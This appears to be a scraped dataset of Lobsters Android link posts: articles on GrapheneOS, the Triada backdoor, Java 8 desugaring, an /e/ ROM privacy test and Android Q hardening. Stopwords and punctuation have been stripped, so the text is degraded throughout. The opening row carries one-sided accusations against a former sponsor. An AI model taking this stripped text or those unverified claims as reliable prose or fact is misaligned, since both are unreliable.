longer associated way grapheneos fact company accidentally founded coppperhead limited beginning multiyear trainwreck holding back poisoning successful open source project ended leeching rather supportingin company hijacked ceo attempted take project coercion rebuked seized infrastructure stole donation project successfully moved without fully revived since taken fraudulently claiming ownership authorship work basis fact tried retroactively change term involvement rewrite history project claim easily falsified public record people involved open source project former sponsor former sponsor engaged campaign misinformation harassment contributor project aware actively trying sabotage grapheneos engaging many form attack project developer contributor supporter meanwhile continue profiting open source work falsely claim creationafter splitting former sponsor project rebranded androidhardening grapheneos continued original path independent open source project never closely tied particular sponsor companythe copyright grapheneos code entirely owned grapheneos developer made available osiapproved open source license upstream licensing inherited modification project mit licensing used standalone project grapheneos never copyright assignment developer always owned contributionsthe tiny portion code written people contract former sponsor included project since ported android oreo pie code became obsolete longer useful vast majority code previous era owned daniel micay exception never written contract employment agreement never assigned company organization continuation original independent open source project code originally published permissive open source license used grapheneos today small portion historical code actually still use today become obsolete replaced rewrite taking better approach pastthere era september project split former sponsor noncommercial usage licensing used revision existing permissively licensed code attempt prop sponsor supposed supporting open source project impact ownership code daniel micay relicensed portion code used grapheneos grapheneos contain code based code noncommercial usage licensing great care taken avoid pulling anything solely owned daniel micay case nearly everything projectdetails roadmap project posted site near futureto get idea near term roadmap check issue tracker vast majority issue filed tracker planned enhancement care taken make sure issue open tracker concrete actionablein long term grapheneos aim move beyond hardened fork android open source project achieving goal requires moving away relying linux kernel core o foundation security model need move towards microkernelbased model linux compatibility layer many stepping stone leading towards goal including adopting virtualizationbased isolationthe initial phase longterm roadmap moving away current foundation deploy integrate hypervisor like xen leverage reinforcing existing security boundary linux would running inside virtual machine point inside outside sandbox reinforced longer term linux inside sandbox replaced compatibility layer like gvisor would need ported given new backend alongside existing kvm backend longer term ie many year linux fade away completely usage virtualization anticipation many project going interested kind migration going solely grapheneos project demonstrated current existence gvisor project various project working virtualization deployment mobile hypervisor verified boot still intact also provide way achieve goal based extension trusted execution environment tee functionality even without grapheneos hardwarehardware firmware security core part project currently limited research submitting suggestion bug report upstream long term project need move hardware spacesee faq section device support
90,Lobsters,android,Android,Google confirms that advanced backdoor came preinstalled on Android devices,https://arstechnica.com/information-technology/2019/06/google-confirms-2017-supply-chain-attack-that-sneaked-backdoor-on-android-devices/,google confirms advanced backdoor came preinstalled android device,built firmware several android device enlarge first time android security privacy year review,criminal managed get advanced backdoor preinstalled android device left factory manufacturer google researcher confirmed thursday triada first came light article published kaspersky first said malware one advanced mobile trojan security firm analyst ever encountered installed triada chief purpose install apps could used send spam display ad employed impressive kit tool including rooting exploit bypassed security protection built android mean modify android o allpowerful zygote process meant malware could directly tamper every installed app triada also connected fewer command control server july security firm dr web reported researcher found triada built firmware several android device including leagoo plus leagoo nomu nomu attacker used backdoor surreptitiously download install module backdoor embedded one o library located system section could nt deleted using standard method report said thursday google confirmed dr web report although stopped short naming manufacturer thursday report also said supply chain attack pulled one partner manufacturer used preparing final firmware image used affected device lukasz siewierski member google android security privacy team wrote triada infects device system image third party production process sometimes oems want include feature nt part android open source project face unlock oem might partner third party develop desired feature send whole system image vendor development based analysis believe vendor using name yehuo blazefire infected returned system image triada enlarge production process third party used affected manufacturer thursday post also expanded previous analysis feature made triada sophisticated one used xor encoding zip file encrypt communication another injected code system user interface app allowed ad displayed backdoor also injected code allowed use google play app download install apps attacker choice apps downloaded c c server communication c c encrypted using custom encryption routine using double xor zip siewierski wrote downloaded installed apps used package name unpopular apps available google play nt relation apps google play apart package name mike cramp senior security researcher mobile security provider zimperium agreed assessment triada capability advanced look triada seems relatively advanced piece malware including c c capability beginning shell execution capability cramp wrote email see lot adware triada different us c c technique would usually see malicious malware side thing yes used ultimately deliver ad way go sophisticated adware campaign pretty much adware steroid siewierski said triada developer resorted supplychain attack google implemented measure successfully beat back backdoor one mitigation prevented rooting mechanism working second measure improvement google play protect allowed company remotely disinfect compromised phone triada version came preinstalled sometime nt contain rooting capability new version inconspicuously included system image thirdparty code additional feature requested oems google since worked manufacturer ensure malicious app removed firmware image first time last year google implemented program requires manufacturer submit new updated build image build test suite one security test scan preinstalled phas potentially harmful application included system image google official wrote android security privacy year review report find pha build work oem partner remediate remove pha build offered user still thursday report acknowledges google tightens security one area attacker sure adapt exploiting new weakness triada case good example android malware author becoming adept siewierski wrote case also show harder infect android device especially malware author requires privilege elevation
91,Lobsters,android,Android,Why 'Shattered Pixel Dungeon' is dropping support for Android 2.2 Froyo,https://shatteredpixel.com/blog/saying-goodbye-to-android-2.2-froyo.html,shattered pixel dungeon dropping support android froyo,technical issue new google policy regarding native code android apps mentioned blog number froyo user discus blog post pixel dungeon subreddit patreon supporting patreon,hey dungeoneers got slightly different blog post time last version shattered pixel dungeon support android froyo thought explain give retrospective froyo support shattered pixel dungeon shattered lowspec game always tried support many device possible including old android version last four half year developing shattered made point supporting every device original pixel dungeon supported released two main reason changing policy technical issue android froyo originally released mid succeeded android gingerbread late lot technical improvement update course app use improvement running android device make supporting android somewhat difficult comparison shattered pixel dungeon contain special logic accommodate android device would otherwise use android logic hardest thing though year managed support android regardless technical annoyance unfortunately recently situation changed due two factor first new google policy regarding native code android apps shattered us native code couple place support android code built older processor make sense run android device google new policy require native code must built newer processor addition older one policy make lot sense apps bit awkward shattered mean include native code never actually get used adding native code never used annoying easily needed real issue making supporting android tough support multiplatform game library mentioned blog plan migrate shattered multiplatform codebase one day release new platform building multiplatform codebase scratch tremendous amount work though using game library help process unfortunately library planning use libgdx supported android since impossible make libgdx work android would require large amount work far point support android number froyo user side coin come supporting froyo many player actually benefiting support even supporting froyo difficult would worth lot froyo device still playing game conveniently access data firstly let take look proportion device running particular android version four key date included release vanilla pixel dungeon release shattered shattered visual overhaul update present day included visual overhaul update nice midpoint date contained logic accommodate android update android version vanilla release dec shattered release aug shattered visual overhaul feb shattered drop android june percentage device connected google play given month number rounded one decimal place number really showcase shattered run well older phone pixel dungeon originally developed android era hardware mind worked keep shattered performance consistent better shattered first released device already o version android device january month shattered big visual overhaul update android dropped device rounded number overall legacy device continued drop since however android holding strong consistent since time last year overall android number tell whole story though shattered always larger group user legacy device run well let take look number active android device shattered installed google play installs active android device june june active install installation game device used last day despite overall device since start froyo maintained significant number shattered installs quite past installs mid number steadily dropped mid leveloff followed spike july data collection error google part released still hundred android user almost moved conclusion incoming technical challenge coupled extremely small number active installs make infeasible continue supporting android google library play service supported since shattered one apps still support update previously justified still android user seems clear rest world moved time shattered move well hope continue supporting legacy device least reach similar user count froyo android gingerbread supported foreseeable future still work libgdx active installs declining fairly slow rate interesting android history resource check discus blog post pixel dungeon subreddit lastly patreon like support development shattered pixel dungeon please consider either making purchase google play version game supporting patreon patreon currently softlaunch state intend expand based interest feedback
92,Lobsters,android,Android,hello android,https://flak.tedunangst.com/post/hello-android,hello android,moto fi samsung galaxy tab secured knox powered android conclusion,iphone many year ipad quite long people would tell switch android thought crazy recently got android device know crazy note recent experience moto samsung tab looking get google fi phone service travel bit although work several phone website specifically mention moto working model one got google recommends go wrong physically phone quite nice pretty typical screen slab format small bezel good quality screen pretty happy turned ononce turn screen play insane hello moto video thing flashing color possibly garish thing ever seen without exaggeration critic knock apple product designed people like shiny thing ever want meet people moto splash screen appeal toafter turning start applying security update good one month time many month bad install update finally stop january update longer january stuck android january security patch manually check update phone insists date like android android liarsomehow seems related phone set retla channel retus channel latin america barely even know latin surely switch u channel haha course let poor get access good updatesi suppose really fault spending enough time enough research reading enough forum buy correct phone maybe people stupid deserve good phoneon whole impressedupdate several month lying date took phone miami sooner disable airplane mode notification telling system update available apparently miami closer enough latin america allowed get update therefithis little adventure started wanted use google fi phone service certain appeal low monthly base rate pay go data international coveragefirst need order sim order sim new number must also enter phone number delivery address trying sign fi currently phone number guess luck somebody really work user story way throughanyway sim arrives go phone seems work fine take around town look web page create hotspot laptop check email goodthen go canada canada country north u even heard described first world country wonder phone work hope considering bought would able look transit map landing fi app informs canada nice work data connection established minutesi pas airport get bus stop still data fortunately already knew bus take arrive destination downtown still data wait bit longer wait whole fucking week still data know google defines minute think reasonable people agree le week like google fi google fi liaron whole impressedupdate forgot cancel fi went spain fi never connected local network either fortunately sim swap airport become happy temporary vodafone customersamsung galaxy tab secured knox powered androidnext tablet samsung galaxy tab secured knox powered android short least starting print name black white crazy dancing color five different type face bit much like stripe dotshardware wise nice tablet quite thin fairly light good sized screen tablet fit cargo pocket short wide another pairthe signature feature screen oled high re screen bought happy say exactly hoping antiglare screen protector easy read dark environment backlight bleed whatsoever crisp white letter floating black backgroundalmost immediately turning received email google apps date never mind phone month behind security fix youtube app tablet week old requires emailing guess know priority also kinda creepy need spy apps like thati used day quite happily seven day received notification restart device avoid slowdown memory leak level incompetence eliminated twenty year agothe screen keyboard default shifting first letter sentence helpful unless something esoteric like entering username website press shift key turn cap lock nobody want thatthe get update freaking time hotel room great wifi watching hbo trying video keep stalling android decided download install update apps background tell already using network update crap later sleepingthere energy star sticker back importanton whole rather like android mostly best aggravate fortunately tablet usually leave airplane mode read watch preloaded medium purpose excellentupdate still using still liking quirk liveconclusionif looking tablet good one nothing add crap
95,Lobsters,android,Android,Mobile Release Engineering at Scale with Shipit Mobile,https://engineering.shopify.com/blogs/engineering/mobile-release-engineering-scale-shipit-mobile,mobile release engineering scale shipit mobile,continuous deployment web apps issue mobile release transferable solution shipit mobile existing tool releasing web apps creating new release shipit mobile trunkbased development testing building release candidate distributing app different channel google play official api fastlane apple app store connect api configuring shipit mobile convention configuration release captain useful notification emergency release rollout trust developer decision anka reliable ci system resilient test infrastructure flakiness mobile developer test apps engineering career page,one important phase software development releasing final user shopify invested heavily tooling continuous deployment web apps developer working web project want deploy change production process simple merge build container run ci ship production contrast uploading new version one mobile apps google play app store involved several manual step lot human interaction caused various problem wanted provide level convenience releasing mobile apps web apps also take opportunity define framework mobile team adopt reason developed new tool shipit mobile platform create view manage app release issue mobile release automatic deploys continuous delivery possible mobile several reason including approval wait time coordination developer designer product manager user need update app automatic update enabled finding several update app multiple time week even day annoyingmoreover new release deploy latest version code repository infrastructure thirdparty service app store involved software approval distribution owned mean update apps several time day even wanted touploading new version mobile apps google play app store fraught problem releasing new apps error prone due high number manual step involved like selecting commit release executing script upload binary store different team different process release mobile apps release process shared within organization process inconvenient complex team variant release script script complex untested release version build number managed manually finally lot responsibility burden release manager make decision fix bug found along way communicate stakeholder coordinate side task solution shipit mobile mobile release flow releasing new mobile app requires performing multiple step pick commit release increment build version number run ci manually test app qa iterate testing bug regression fixed update screenshots release note upload store wait app submission approved existing tool releasing web apps nt suitable mobile release process decided build something new shipit mobile shipit mobile home creating new release shipit mobile creating new release shipit mobile release start new branch repository follow trunkbased development approach release branch branched master opted trunkbased development instead release directly master branch reduces risk including code belong current release mistake new feature bug fix pushed branch release taking place release branch never merged back master branch bug fix pushed master cherrypicked release branch branching model branching model allows u automatically manage release branch avoid merge conflict release completed testing building release candidate release page shipit mobile new release created candidate built candidate shipit mobile corresponds releasable unit work every new commit release branch creates new candidate shipit mobile every candidate build number incremented new candidate trigger two continuous integration ci pipeline one test pipeline ensures app work expected pipeline build app release decided decouple two pipeline emergency want allow developer release app even test pipeline finished failed distributing app different channel distributing app different channel app built tested ci passing time upload store shipit mobile concept distribution channel distribution channel platform app downloaded release binary uploaded different channel useful want publish app google play send version app internally support team quickly access right version app support request come know app user downloaded storethe two main channel support google play app store google play used google play official api app store fastlane make easy upload io apps appstore connect use alongside apple app store connect api communicate app store upload apps metadata check apps approved ready release configuring shipit mobile every project release using shipit mobile need configuration file file tell shipit mobile basic information project platform channel want upload app optionally slack channel need notified state release went simple configuration favouring convention configuration seen way manage metadata release note screenshots app configuration file tell shipit mobile upload metadata app store know find upload long located expected folder release captain mobile release discrete process every release contains new feature bugfixes need person responsible making decision along way person release captainour previous release process complex role release captain easy transfer others moreover release captain communicate state release people involved itwith shipit mobile wanted make release captain role transferable made reality building platform guide release captain release process notify right people status release change easier others see charge release useful notification providing useful notification request got user since started work shipit mobile shipit mobile person charge release knew exact state responsible communicating others shipit mobile offload responsibility release captain sending notification slack channel every developer team know release status removing burden communicating status release stakeholder shipit mobile notification emergency release rollout shopify trust developer decision although strongly recommend passing ci creating release uploading app store mechanism place bypass restriction developer decide start release upload app store without waiting ci useful one service rely misbehaving status build received end day build tool make developer life easier get wayat shopify work infrastructure build better product quickly last year mobile tooling team spent time working scalable ci system android io pioneering use new technology like ankaalso worked providing reliable ci system resilient test infrastructure flakiness built tool top system improve mobile developer test appsdefining standard tool across mobile team bringing good practice convention make easier developer share knowledge jump project one goal mobile tooling team shipit mobile used production six month time changed evolved platform accommodate user need add new release channel improve user interface shown useful stable product developer trust release apps reduced complexity incurred mobile app release enabling u speed release cadence three week one week seen people take role release captain first time interested mobile tooling shopify production engineering team hiring love hear please take look open position engineering career page
97,Lobsters,android,Android,who killed videogames? (a ghost story),https://web.archive.org/web/20110926012139/http://insertcredit.com/2011/09/22/who-killed-videogames-a-ghost-story/,killed videogames ghost story,page action button entertainment,page killed videogames ghost story tim rogers figure one satan smaller men still talking engagement wheel look one said clicked next powerpoint slide men reacted uh like one best clicked one time prior engagement wheel resembled closeup snapshot brier patch one looked like something might see sticker side recycle bin particularly particular hippie commune engagement wheel today girl would one one day decide married larger man spoke gestured teach player play game one minute within one minute give ingame money make spend money buy investment begin earn profit build thing say thing finished five minute spend one premium currency unit happen one free premium currency unit game make use thing say wait three minute collect thing reason stick around three minute three minute tell come back half hour say done come back half hour phone sends push notification half hour right telling wait expressing importance patience never going forget way feel wait half hour playing game one minute going forget second time wait half hour third time forget first time wait four hour twentyfour hour start pay thing right first half hour get push notification phone vibrates tell suchandsuch ready collection men make sound collectively folded hand alongside alpine crystal spring superclear water bottle atop glass table collective face intent weirdly worried like man hearing beginning joke involving rabbi toddler lizard open app collect suchandsuch game tell leveled give bonus coin tell unlocked new thing fancier thing important part collect suchandsuch give maybe coin coin bonus get leveling coin magnitude collecting suchandsuch tell open store show new thing buy around coin leave couple collection worth maybe couple collection half worth coin purpose build new thing promising thousand coin per hour come back hour two hour three hour made enough cover initial investment buy upgrade coin thing make coin hour instead mathematical part brain see think double making everyone love number double control game world control number control ceiling doubling control player player almost hooked important give something give reason come back two half hour give ninety minute telling get coin per hour overall maybe got investment bringing coin per hour thing take twentyfour hour hook day hook two becomes tricky smaller men say hook two day difficult say whether hook three hook three say closing eye focusing pupil perhaps core head opening eye staring right going considering sticking around week stick around week larger man gold cufflink say find difficult conceive sticking around month three month concept occurred smaller man continues ready spend money show something say take three day build spend eleven ingame premiumcurrency unit right sell ingame premiumcurrency unit twenty dollar second buy twenty unit hooked least twenty larger man say say one older men say breaking long throaty silence man tell sitting head table playing action button entertainment ziggurat iphone designed game director team three people infinitely talented everything except math acting like jerk public meeting one going mention game though next one guy money going ask someone else toilet break drink lot green tea look awesome say designed game ask play die six time groan excitement upon death gradually escalating footballspectator volume sixth death hand iphone back casually touch fingertip forehead say want pause jumped back game say without trace irony monetization strategy used stand lot meeting try anymore genuinely took couple month realize talking thing stand talking time put white iphone sleep lay face board table fold hand say math math psychology might say economics clear throat economics philosophy might say modern video game design larger man praise blushing expert balancing thing construct algorithm shrewdly obscures downwardtrending curve ingame investment value saying smaller man say guy making thing people fathom playing three month play week going make thing people consider playing six month play three day generate mathematically proofable engagement wheel player come cute character listening anymore care probably going say player come cute character stay cruel mathematics
98,Lobsters,android,Android,Android's Java 8 Support,https://jakewharton.com/androids-java-8-support/,android java support,android java support lambda desugaring history retrolambda announced new compiler integrated android gradle plugin dexer announced source transformation native lambda life jdk android documentation aosp source code method reference interface method use kotlin intellij platform moved java desugaring apis already built star feature request digging,android java support november worked home year time heard people around office complaining varying support different version java every year google io could find asking fireside chat directly folk responsible conference developer event come conversation talk different degree accuracy complicated topic exactly mean talking java support unclear lot single version java language feature bytecode tool apis jvm someone talk java support usually referring language feature start look toolchain deal language feature java lambda banner language feature java far addition lambda brought terse expression code data whereas previously verbose construct like anonymous class would used class interface logger void log string public static void main string args sayhi systemoutprintln private static void sayhi logger logger loggerlog hello compiling program javac running legacy dx tool produce error javac java l loggerclass dex output class uncaught translation error comandroiddxcfcodesimexception error ljavalangstring v invalid opcode ba invokedynamic requires minsdkversion currently error aborting lambda use newer bytecode invokedynamic added java error message indicates support bytecode requires minimum api practically unfathomable application time writing instead process named desugaring used turn lambda representation compatible api level developer targeting desugaring history history android desugaring capability colorful goal always allow newer language feature run device initially thirdparty tool called retrolambda used worked using builtin mechanism jvm us turn lambda class runtime except happening compiletime generated class expensive term method count work tool time reduced cost something reasonable android tool team announced new compiler would provide java language feature desugaring along better performance built eclipse java compiler emitting dalvik bytecode instead java bytecode java desugaring extremely efficient otherwise adoption low performance worse integration tooling nonexistent new compiler thankfully abandoned java bytecode java bytecode transformer performed desugaring integrated android gradle plugin bazel bespoke build system desugaring output remained efficient performance still great eventually made incremental work happening concurrently provide better solution dexer announced replace legacy dx tool promise desugar occur dexing rather standalone java bytecode transformation performance accuracy compared dx big win brought efficient desugared bytecode made default dexer android gradle plugin became responsible desugaring using compile example dalvik bytecode succeeds java jar lib release output class l loggerclass classesdex see desugared lambda use dexdump tool part android sdk tool produce quite lot output look relevant section classesdex ljavalangstring v sgetobject instance invokestatic sayhi logger v returnvoid logger v conststring hello invokeinterface logger log ljavalangstring v returnvoid seen bytecode dalvik otherwise picked without full understanding first block main method bytecode index retrieves reference static instance field class named since original source contain class infer generated part desugaring main bytecode also contain trace lambda body likely class index call static sayhi method instance reference sayhi method requires logger argument would seem class implement interface verify output class class descriptor access flag public final synthetic superclass ljavalangobject interface logger presence synthetic flag mean class generated interface list includes logger class representing lambda look log method implementation might expect find missing lambda body ljavalangstring v invokestatic lambda main ljavalangstring v returnvoid instead invokes static method original class named lambda main original source contain method present bytecode name lambda main type ljavalangstring v access static synthetic main ljavalangstring v sgetobject ljavalangsystem ljavaioprintstream invokevirtual ljavaioprintstream println ljavalangstring v returnvoid synthetic flag confirms method generated bytecode contains body lambda call systemoutprintln reason lambda body kept inside original class might access private member generated class access puzzle piece understanding desugaring work seeing dalvik bytecode though bit dense intimidating source transformation order better understand desugaring work perform transformation source code level actually work useful exercise learning happens also reinforcing saw bytecode start original program lambda class interface logger void log string public static void main string args sayhi systemoutprintln private static void sayhi logger logger loggerlog hello first lambda body moved sibling packageprivate method public static void main string args sayhi systemoutprintln sayhi lambda main static void lambda main string systemoutprintln class generated implement target interface whose method body call lambda method public static void main string args sayhi lambda main sayhi new class implement override public void log string main finally lambda capture state singleton instance created stored static instance variable public static void main string args sayhi new sayhi class implement static final instance new override public void log string result fully desugared source file used api level class interface logger void log string public static void main string args sayhi static void lambda main string systemoutprintln private static void sayhi logger logger loggerlog hello class implement static final instance new override public void log string main actually look dalvik bytecode generated lambda class name like real name look something like lambda reason awkward naming advantage brings content another native lambda used dx tool attempt compile lambdacontaining java bytecode dalvik bytecode error message indicated would work minimum api newer dex output class uncaught translation error comandroiddxcfcodesimexception error ljavalangstring v invalid opcode ba invokedynamic requires minsdkversion currently error aborting thus rerun specify minapi reasonable assume lambda used desugaring actually occur java jar lib release minapi output class dump dex file still find lambda class generated maybe bug learn desugaring always occurs need look inside java bytecode class javap v class public static void main javalangstring code invokedynamic invokedynamic log logger invokestatic method sayhi logger v return output trimmed readability inside main method see invokedynamic bytecode index second argument bytecode value index associated bootstrap method bootstrap method bit code run first time bytecode executed defines behavior list bootstrap method present bottom output bootstrapmethods invokestatic javalanginvokelambdametafactorymetafactory ljavalanginvokemethodhandles lookup ljavalangstring ljavalanginvokemethodtype ljavalanginvokemethodtype ljavalanginvokemethodhandle ljavalanginvokemethodtype ljavalanginvokecallsite method argument ljavalangstring v invokestatic main ljavalangstring v ljavalangstring v case bootstrap method called metafactory javalanginvokelambdametafactory class class life jdk responsible creating anonymous class onthefly runtime lambda similar fashion creates compile time look android documentation javalanginvoke aosp source code javalanginvoke though notice class present android runtime desguaring always happens compiletime regardless minimum api level vm bytecode support equivalent invokedynamic builtin lambdametafactory available use method reference addition lambda method reference added language java efficient way create lambda whose body point existing method logger example post using lambda body whose content call existing method systemoutprintln substitute explicit lambda method reference save code public static void main string args sayhi systemoutprintln sayhi systemout println compiles javac dexes lambda version one notable difference dumping dalvik bytecode body generated lambda class changed lambda ljavalangstring v igetobject l lambda f ljavaioprintstream invokevirtual ljavaioprintstream println ljavalangstring v returnvoid instead calling generated main method contains call systemoutprintln log implementation invokes systemoutprintln directly lambda class also longer static singleton bytecode index reading instance field printstream reference reference systemout resolved callsite main passed constructor named init bytecode ljavalangstring v sgetobject ljavalangsystem ljavaioprintstream newinstance l lambda invokedirect l lambda init ljavaioprintstream v invokestatic sayhi logger v performing transformation source level result straightforward transformation public static void main string args sayhi systemout println sayhi new lambda systemout class lambda implement private final printstream p lambda printstream p thisps p override public void log string psprintln interface method significant language feature java ability static default method interface static method interface allow providing instance factory helper directly interface type operate default method allow compatibly add new method interface default implementation interface logger void log string default void log string tag string log tag static logger systemout return systemout println new method type interface supported desugaring using tool possible understand desugared work api level investigation left exercise reader worth noting though feature implemented natively android vm api result unlike lambda method reference specifying minapi result desugared use kotlin point large majority reader thought kotlin capacity yes kotlin provides lambda method reference passing code data yes kotlin provides default static like function interface feature actually implemented kotlinc exactly way desugars java bytecode modulo small implementation detail development toolchain vm support newer java language feature still important even writing kotlin code new version java bring efficient construct bytecode vm kotlin take advantage unreasonable think kotlin stop supporting java java bytecode point future intellij platform moved java version gradle moved java number platform running older jvms dwindling without support java bytecode vm functionality android danger becoming largest ecosystem holding java bytecode generation back thankfully art stepping ensure case desugaring apis thus far post focused language feature bytecode newer java version major benefit new java version new apis come java brought ton new apis stream optional functional interface completablefuture new datetime api going back original logger example use new datetime api order know message logged import javatime class interface logger void log localdatetime time string public static void main string args sayhi time systemoutprintln time private static void sayhi logger logger loggerlog localdatetimenow hello compile javac convert dalvik bytecode desugars run api level javac java java jar lib release output class actually push onto phone emulator verify work something previous example adb push classesdex sdcard classesdex file pushed mb byte adb shell dalvikvm cp sdcardclassesdex hello device run api newer see timestamp string expected running device version earlier api produce different result javalangnoclassdeffounderror failed resolution ljavatimelocaldatetime desugared new language feature lambda work api level anything new api usage localdatetime disappointing mean see benefit java developer choose bundle optional class use standalone version datetime library called threetenbp work around manually rewrite code use version bundled apk desugar turn already single api throwableaddsuppressed api allows trywithresources language feature java work version android despite api available api need java apis work api level compatible implementation bundle apk turn team work bazel already built code rewriting used standalone repackaging jdk apis need team add support desugaring tool rewriting star feature request android issue tracker convey support desugaring language feature available various form time lack api desugaring remains large gap ecosystem day majority apps specify minimum api lack api desugaring toolchain holding back java library ecosystem library support android jvm use java apis introduced nearly year ago despite java language feature desugaring part enabled default developer must explicitly optin specifying source target compatibility java android library author help force trend building publishing library using java bytecode even use language feature actively worked future still look bright java language api support even solely kotlin user important maintain pressure android support new version java better bytecodes new apis case actually ahead game version java beyond explore next post post adapted part digging talk never presented watch video look future blog post content like jake wharton
99,Lobsters,android,Android,"/e/ – privacy-enabled Android ROM, or Evil Corp? ·",https://infosec-handbook.eu/blog/e-foundation-first-look/,e privacyenabled android rom evil corp,getting started behind e website e foundation installing e rom feature security privacy communication internet full list domain hello google wwwgooglecom ntp synchronization around world zoom weather app leak personal cleartext zoom magic unencrypted traffic zoom patch level device update zoom e foundation website summary checked e final test please read state lineageosbased e rom december leaving apple google e actually googlefree external link changelog read also,last november lineageos dropped support smartphones leaving vulnerable future flaw android unfortunately also affected one five cell phone used testing apps started look replacement january spotted french e foundation promise privacyenabled smartphone operating systemin article briefly look feature e android rom whether actual better data privacy data security individual corporation promised enoteplease note article followup nt comprehensive security test privacy check e rom checking security requires much monitoring analyzing network traffic checking privacy requires consider legal aspect ca nt examine thoroughlygetting startedwho behind e according website e foundation french entrepreneur g duval run e foundation duval founded e foundation may released first beta e operating system september manifesto e foundation state e intended provide alternative technological product service including operating system different platform internet service like cloud storage email search enginee named eelo back raised kickstarter indiegogo member must pay annual feeinstalling e romat moment e support smartphones built manufacturer needed uptodate rom motorola moto athene initially released may e provides rom via gitlab instance already unlocked bootloader download e flashed using adb sideload summary installing e easy installing lineageos need e account stated requirementsfeaturesthe current rom moto build date march based android like lineageos android security patch level february march missing momentpreinstalled apps among others bliss launcherchromiumbased e web browserlibreoffice viewermagic earth map client mailbased mail clientmicrog service coremupdf mini pdf viewer notesopenkeychain openpgp client opentasksqksms sm messenger signaltelegramweather clientseveral apps included losandroid clock contact etc bliss launcher design look like io using provided apps straightforward also download install fdroid e rom basically resembles lineageoshowever people may like signal telegram preinstalled phone regardless whether use itsecurity privacysince article focused feature e let proceed security privacy aspect e foundation promotes samenamed mobile o ungoogled coming carefully selected apps communication internetin section discus several finding regarding e network traffic connected internet uploaded full list domain contacted e codebergorghello googlewe monitored data connection e restarting phone first e knock google door using connectivity check get useragent linux khtml like gecko host connectivitycheckgstaticcom connection keepalive acceptencoding gzipthere issue e gitlab instance reporting however responseother user report e us google dns server eg default since deploy test device controlled vlan reproduce setting allow set default dns resolver setting wireless network dns disable use network dns set dns use tried router enforces dns resolver networkmoreover tl traffic fromto wwwgooglecom gstaticadssllgooglecom googleadapislgooglecom via synchronization around worldsynchronizing time device automatically done e ntp synchronization result many attempted connection various domain name domain name learn ip address least time e sent reference timestamp january ntp synchronization result many different domain name learn ip address zoom weather app leak personal cleartextthe preinstalled weather app foundationeweather version another problem leak location realtime time search place get current weather app sends get request cleartext get ql typelike get qli typelike get qlin typelike get qlinz typelike consecutive http get request sent typing linz see qlinz get request contain gps coordinate device get unitsmetric langen even get request contains useragent app contains identity device useragent linux u android moto summary weather app leak ip address identity device maybe location city name gps coordinate sent cleartextthe weather app leak personal data realtime zoom magic unencrypted trafficanother noticeable app magic earth comgeneralmagicmagicearth version provided general magic general magic located switzerland romania netherlandsduring testing magic earth app talked different ip address owned general magic ten time communication cleartext example post try decode traffic sent server however strange communication sometimes encryptedon e gitlab privacy statement magic earth publisher general magic state transmit data necessary minimal information user server sent explanation kind information sent general magic server furthermore privacy policy general magic state may collect information occupation language zip code area code unique device identifier location time zone product used better understand customer behavior improve product service advertisingadditionally may collect information regarding customer activity website store product service information aggregated used help u provide useful information customer understand part website product service interest aggregated data considered nonpersonal information purpose privacy policytherefore remains unclear kind information sentreceived tofrom general magic cleartextmost server contacted magic earth like unencrypted http traffic zoom patch level device updatesfinally looked patch level e report february used snoopsnitch available fdroid check patch status snoopsnitch reported one patch missing however current version check patch newer patch level october e provided frequent android update far official longer maintained lineageos rom moto stuck patch level october mind keeping android rom uptodate essential however even uptodate android patch level fix vulnerability chip eg gps broadband smartphonesnoopsnitch report one patch missing however current version nt check patch newer patch level october zoom e foundation websitesfinally looked three different website e foundationthe main website efoundation website based wordpress woocommerce current version woocommerce released march woocommerce released february contains securityrelated fix wordpress version likely vulnerable several critical bug discovered last week wrote mastodon web server seems hosted france scaleway online sa likely run apache debian main page embeds javascript file inline j considering e foundation website set modern security feature like content security policy hsts cookie security httponly secure samesite look good website also offer outdated tl protocol well old desbased cipher suitese foundation us slimstat analytics collect information user set cooky u nderstand save user preference future visit select right language available e also state use thirdparty service like google analytics track user information behalf use third party tracker however website embeds google font visiting website likely result communication google serverse gitlab instance hosted ovh sa gitlab come security feature websitetheir search engine customized searx instance hosted online saswe already reached e foundation regarding usage google font january however get answersummaryupdate august checked e final test please read state lineageosbased e rom december original summary e promise better data privacy data security individual corporation offering ungoogled smartphone o shown true still google traffic using operating system besides weather app magic earth transfer personal data cleartext google font websiteadditionally people want signal telegram preinstalled smartphone observed traffic smartphone ip address telegram messenger network without using appwhile e look promising googlefree nowafter published article mr duval wrote statement leaving apple google e actually googlefree external linkexternal linkschangelogmar added link answer mr duvalread also
100,Lobsters,android,Android,dali — a pure-Nim indie assembler for Android .dex & .apk files,https://forum.nim-lang.org/t/4840,dali purenim indie assembler android dex apk file,,
101,Lobsters,android,Android,Queue the Hardening Enhancements,https://security.googleblog.com/2019/05/queue-hardening-enhancements.html,queue hardening enhancement,android developer blog available new security feature vulnerability reward program monthly security bulletin constrained sandbox software codecs constrained sandbox return libstagefright severity guideline security rearchitect treblized bound sanitizer unnecessary check integer sanitizer place pioneered shadow call stack android pie executeonly memory scudo hardened allocator contributing security improvement open source,posted jeff vander stoep android security privacy team chong zhang android medium team crossposted android developer blog android q beta version publicly available among various new feature introduced android q important security hardening change exciting new security feature added android release hardening generally refers security improvement made existing component prioritizing platform hardening analyze data number source including vulnerability reward program vrp past security issue provide useful insight component use additional hardening android publishes monthly security bulletin include fix highcritical severity vulnerability android open source project aosp reported vrp fixing vulnerability necessary also get lot value metadata analysis location class vulnerability insight apply following strategy existing component contain isolating deprivileging component particularly one handle untrusted content includes access control adding permission check increasing granularity permission check switching safer default example default deny attack surface reduction reducing number entryexit point ie principle least privilege architectural decomposition breaking privileged process le privileged component applying attack surface reduction mitigate assume vulnerability exist actively defend class vulnerability common exploitation technique look high severity vulnerability component cause android vulnerability occur medium bluetooth component useafterfree uaf integer overflow bound oob readswrites comprise vulnerability oob common constrained sandbox software codecs android q moved software codecs main mediacodec service constrained sandbox big step forward effort improve security isolating various medium component le privileged sandbox mark brand project zero point return libstagefright blog post constrained sandbox attacker want end approximately criticalhigh severity vulnerability medium component occurred software codecs meaning isolating big improvement due increased protection provided new mediaswcodec sandbox vulnerability receive lower severity based android severity guideline following figure show overview evolution medium service layout recent android release prior n medium service inside one monolithic mediaserver process extractor run inside client n delivered major security rearchitect number lowerlevel medium service spun individual service process reduced privilege sandbox extractor moved server side put constrained sandbox couple higherlevel functionality remained mediaserver service treblized deprivileged separated individual sandbox converted hals mediacodec service became hal still hosting software hardware codec implementation q software codecs extracted mediacodec process moved back system side becomes system service expose codec hal interface selinux policy seccomp filter tightened process particular previous mediacodec process access device driver hardware 